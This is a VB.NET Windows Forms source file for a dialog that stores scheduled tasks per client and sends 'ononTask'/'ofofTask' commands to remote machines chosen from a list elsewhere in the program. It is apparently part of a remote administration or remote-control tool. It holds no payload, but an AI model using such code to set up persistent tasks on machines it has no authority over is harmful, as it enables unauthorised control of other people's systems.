Imports System.Windows.Forms
Imports System.Runtime.InteropServices

Public Class Form20

    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private testfile As String = Application.StartupPath & "/bookbinder/" & (Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(0).Text) + "\" + "tas.txt"

    Private Sub Form20_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox4.Hide()
        Label4.Hide()
        SetWindowTheme(ListView1.Handle, "explorer", Nothing)
        ListView1.Items.Clear()
        Dim myCoolFileLines() As String = IO.File.ReadAllLines(testfile)
        For Each line As String In myCoolFileLines
            Dim lineArray() As String = line.Split("#")
            Dim newItem As New ListViewItem(lineArray(0))
            newItem.SubItems.Add(lineArray(1))
            newItem.SubItems.Add(lineArray(2))
            ListView1.Items.Add(newItem)
        Next
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        For Each item As ListViewItem In ListView1.SelectedItems
            ListView1.Items.Remove(item)
        Next
        Dim myWriter As New IO.StreamWriter(testfile)
        For Each myItem As ListViewItem In ListView1.Items
            myWriter.WriteLine(myItem.Text & "#" & myItem.SubItems(1).Text & "#" & myItem.SubItems(2).Text)
        Next
        myWriter.Close()


        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "ofofTask" & "|U|" & TextBox1.Text)
        Next

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim sampleitem As New ListViewItem
        sampleitem.Text = TextBox1.Text
        sampleitem.SubItems.Add(TextBox2.Text)
        sampleitem.SubItems.Add(TextBox3.Text)
        ListView1.Items.Add(sampleitem)

        Me.DialogResult = System.Windows.Forms.DialogResult.OK


        Dim myWriter As New IO.StreamWriter(testfile)
        For Each myItem As ListViewItem In ListView1.Items
            myWriter.WriteLine(myItem.Text & "#" & myItem.SubItems(1).Text & "#" & myItem.SubItems(2).Text)
        Next
        myWriter.Close()

        For Each x As ListViewItem In Form1.L1.SelectedItems
            If ComboBox2.Text = "Every minute" Then
                Form1.S.Send(x.ToolTipText, "ononTask" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & TextBox3.Text & "|U|" & "1" & "|U|" & "")
            ElseIf ComboBox2.Text = "Every day" Then
                Form1.S.Send(x.ToolTipText, "ononTask" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & TextBox3.Text & "|U|" & "2" & "|U|" & "")

            ElseIf ComboBox2.Text = "on the first of every month" Then
                Form1.S.Send(x.ToolTipText, "ononTask" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & TextBox3.Text & "|U|" & "3" & "|U|" & TextBox4.Text)

            ElseIf ComboBox2.Text = "On the first of every week" Then
                Form1.S.Send(x.ToolTipText, "ononTask" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & TextBox3.Text & "|U|" & "4" & "|U|" & TextBox4.Text)

            End If
        Next
    End Sub



    Private Sub ListView1_SelectedIndexChanged_1(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        On Error Resume Next
        TextBox1.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        TextBox2.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text
        TextBox3.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(2).Text

        '9999999999999999999
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged
        If ComboBox2.Text = "Every minute" Then
            TextBox3.Text = "mo 1"
            Label3.Text = "Minutes pm:"
            TextBox4.Hide()
            Label4.Hide()
        ElseIf ComboBox2.Text = "Every day" Then
            TextBox3.Text = "ST 09:39"
            Label3.Text = "Time:"
            TextBox4.Hide()
            Label4.Hide()
        ElseIf ComboBox2.Text = "on the first of every month" Then
            TextBox3.Text = "D 1 "
            Label3.Text = "Day of the month:"
            TextBox4.Show()
            Label4.Show()


        ElseIf ComboBox2.Text = "On the first of every week" Then
            TextBox3.Text = "D MON,TUE,WED,THU,FRI "
            Label3.Text = "In the days running:"
            TextBox4.Show()
            Label4.Show()
        End If


    End Sub
End Class